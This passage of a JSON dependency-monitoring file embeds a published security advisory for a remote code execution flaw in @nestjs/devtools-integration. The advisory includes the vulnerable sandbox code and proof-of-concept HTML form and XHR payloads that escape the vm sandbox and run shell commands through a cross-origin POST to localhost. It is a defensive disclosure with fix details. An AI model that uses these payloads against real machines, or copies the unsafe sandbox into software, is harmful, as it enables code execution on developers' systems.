+      "description": "## Summary\r\nA critical Remote Code Execution (RCE) vulnerability was discovered in the `@nestjs/devtools-integration` package. When enabled, the package exposes a local development HTTP server with an API endpoint that uses an unsafe JavaScript sandbox (`safe-eval`-like implementation). Due to improper sandboxing and missing cross-origin protections, any malicious website visited by a developer can execute arbitrary code on their local machine.\r\n\r\nA full blog post about how this vulnerability was uncovered can be found on [Socket's blog](https://socket.dev/blog/nestjs-rce-vuln).\r\n\r\n## Details\r\nThe `@nestjs/devtools-integration` package adds HTTP endpoints to a locally running NestJS development server. One of these endpoints, `/inspector/graph/interact`, accepts JSON input containing a `code` field and executes the provided code in a Node.js `vm.runInNewContext` sandbox.\r\n\r\nKey issues:\r\n1. **Unsafe Sandbox:** The sandbox implementation closely resembles the abandoned `safe-eval` library. The Node.js `vm` module is [explicitly documented](https://nodejs.org/api/vm.html) as not providing a security mechanism for executing untrusted code. Numerous known sandbox escape techniques allow arbitrary code execution.\r\n2. **Lack of Proper CORS/Origin Checking:** The server sets `Access-Control-Allow-Origin` to a fixed domain (`https://devtools.nestjs.com`) but does not validate the request's `Origin` or `Content-Type`. Attackers can craft POST requests with `text/plain` content type using HTML forms or simple XHR requests, bypassing CORS preflight checks.\r\n\r\nBy chaining these issues, a malicious website can trigger the vulnerable endpoint and achieve arbitrary code execution on a developer's machine running the NestJS devtools integration.\r\n\r\nRelevant code from the package:\r\n\r\n```js\r\n// Vulnerable request handler\r\nhandleGraphInteraction(req, res) {\r\n  if (req.method === 'POST') {\r\n    let body = '';\r\n    req.on('data', data => { body += data; });\r\n    req.on('end', async () => {\r\n      res.writeHead(200, { 'Content-Type': 'application/plain' });\r\n      const json = JSON.parse(body);\r\n      await this.sandboxedCodeExecutor.execute(json.code, res);\r\n    });\r\n  }\r\n}\r\n\r\n// Vulnerable sandbox implementation\r\nrunInNewContext(code, context, opts) {\r\n  const sandbox = {};\r\n  const resultKey = 'SAFE_EVAL_' + Math.floor(Math.random() * 1000000);\r\n  sandbox[resultKey] = {};\r\n  const ctx = `\r\n    (function() {\r\n      Function = undefined;\r\n      const keys = Object.getOwnPropertyNames(this).concat(['constructor']);\r\n      keys.forEach((key) => {\r\n        const item = this[key];\r\n        if (!item || typeof item.constructor !== 'function') return;\r\n        this[key].constructor = undefined;\r\n      });\r\n    })();\r\n  `;\r\n  code = ctx + resultKey + '=' + code;\r\n  if (context) {\r\n    Object.keys(context).forEach(key => { sandbox[key] = context[key]; });\r\n  }\r\n  vm.runInNewContext(code, sandbox, opts);\r\n  return sandbox[resultKey];\r\n}\r\n```\r\n\r\nBecause the sandbox can be trivially escaped, and the endpoint accepts cross-origin POST requests without proper checks, this vulnerability allows arbitrary code execution on the developer's machine.\r\n\r\n## PoC\r\nCreate a minimal NestJS project and enable @nestjs/devtools-integration in development mode:\r\n\r\n```\r\nnpm install @nestjs/devtools-integration\r\nnpm run start:dev\r\n```\r\n\r\nUse the following HTML form on any malicious website:\r\n\r\n\r\n```html\r\n<form action=\"http://localhost:8000/inspector/graph/interact\" method=\"POST\" enctype=\"text/plain\">\r\n  <input name=\"{&quot;code&quot;:&quot;(function(){try{propertyIsEnumerable.call()}catch(pp){pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app')}})()&quot;,&quot;bogus&quot;:&quot;\" value=\"&quot;}\" />\r\n  <input type=\"submit\" value=\"Exploit\" />\r\n</form>\r\n```\r\n\r\nWhen the developer visits the page and submits the form, the local NestJS devtools server executes the injected code, in this case launching the Calculator app on macOS.\r\n\r\nAlternatively, the same payload can be sent via a simple XHR request with text/plain content type:\r\n\r\n```html\r\n<button onclick=\"sendPopCalculatorXHR()\">Send pop calculator XHR Request</button>\r\n<script>\r\n    function sendPopCalculatorXHR() {\r\n        var xhr = new XMLHttpRequest();\r\n        xhr.open(\"POST\", \"http://localhost:8000/inspector/graph/interact\");\r\n        xhr.withCredentials = false;\r\n        xhr.setRequestHeader(\"Content-Type\", \"text/plain\");\r\n        xhr.send('{\"code\":\"(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'open /System/Applications/Calculator.app\\'); } })()\"}');\r\n    }\r\n</script>\r\n```\r\n\r\n### Full POC\r\n\r\nMinimal reproducer: https://github.com/JLLeitschuh/nestjs-typescript-starter-w-devtools-integration\r\n\r\nSteps to reproduce:\r\n\r\n1. Clone Repo https://github.com/JLLeitschuh/nestjs-typescript-starter-w-devtools-integration\r\n2. Run NPM install\r\n3. Run `npm run start:dev`\r\n4. Open up the POC site here: https://jlleitschuh.org/nestjs-devtools-integration-rce-poc/\r\n5. Try out any of the POC payloads.\r\n\r\nSource for the `nestjs-devtools-integration-rce-poc`: https://github.com/JLLeitschuh/nestjs-devtools-integration-rce-poc\r\n\r\n## Impact\r\n\r\nThis vulnerability is a Remote Code Execution (RCE) affecting developers running a NestJS project with `@nestjs/devtools-integration` enabled. An attacker can exploit it by luring a developer to visit a malicious website, which then sends a crafted POST request to the local devtools HTTP server. This results in arbitrary code execution on the developer’s machine.\r\n\r\n- Severity: Critical\r\n- Attack Complexity: Low (requires only that the victim visits a malicious webpage, or be served malvertising)\r\n- Privileges Required: None\r\n- User Interaction: Minimal (no clicks required)\r\n\r\n## Fix\r\nThe maintainers remediated this issue by:\r\n\r\n - Replacing the unsafe sandbox implementation with a safer alternative (@nyariv/sandboxjs).\r\n - Adding origin and content-type validation to incoming requests.\r\n - Introducing authentication for the devtools connection.\r\n\r\nUsers should upgrade to the patched version of @nestjs/devtools-integration as soon as possible.\r\n\r\n## Credit\r\n\r\nThis vulnerability was uncovered by @JLLeitschuh on behalf of [Socket](https://socket.dev/). ",
+      "severity": "critical",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-85cg-cmq5-qjm7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-54782",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2025-08-01T17:27:04Z",
+      "published_at": "2025-08-01T17:27:04Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/devtools-integration"
+          },
+          "vulnerable_version_range": "<=0.2.0",
+          "patched_versions": "0.2.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+          "score": 9.4
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-77",
+          "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
+        },
+        {
+          "cwe_id": "CWE-78",
+          "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        },
+        {
+          "cwe_id": "CWE-352",
+          "name": "Cross-Site Request Forgery (CSRF)"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-77",
+        "CWE-78",
+        "CWE-352"
+      ],
+      "credits": [
+        {
+          "login": "JLLeitschuh",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "JLLeitschuh",
+            "id": 1323708,
+            "node_id": "MDQ6VXNlcjEzMjM3MDg=",
+            "avatar_url": "https://avatars.githubusercontent.com/u/1323708?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/JLLeitschuh",
+            "html_url": "https://github.com/JLLeitschuh",
+            "followers_url": "https://api.github.com/users/JLLeitschuh/followers",
+            "following_url": "https://api.github.com/users/JLLeitschuh/following{/other_user}",
+            "gists_url": "https://api.github.com/users/JLLeitschuh/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/JLLeitschuh/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/JLLeitschuh/subscriptions",
+            "organizations_url": "https://api.github.com/users/JLLeitschuh/orgs",
+            "repos_url": "https://api.github.com/users/JLLeitschuh/repos",
+            "events_url": "https://api.github.com/users/JLLeitschuh/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/JLLeitschuh/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  ],
+  "totals": {
+    "continuous_monitoring_score": 100,
+    "alert_signal": 0,
+    "alert_response_rate_percent": 100,
+    "security_advisories_total": 7
+  },
+  "Continuous Dependency Monitoring": 100,
+  "continuous_monitoring_score": 100,
+  "continuous_monitoring_percent": 100,
+  "alert_signal": 0,
+  "alert_response_rate_percent": 100,
+  "metrics": [
+    {
+      "l4_classification": "Continuous Dependency Monitoring",
+      "l5_metric": "Real-Time Alerting",
+      "field": "continuous_monitoring_score",
+      "value": 100,
+      "score": 100,
+      "covered": "yes"
+    }
+  ]
+}
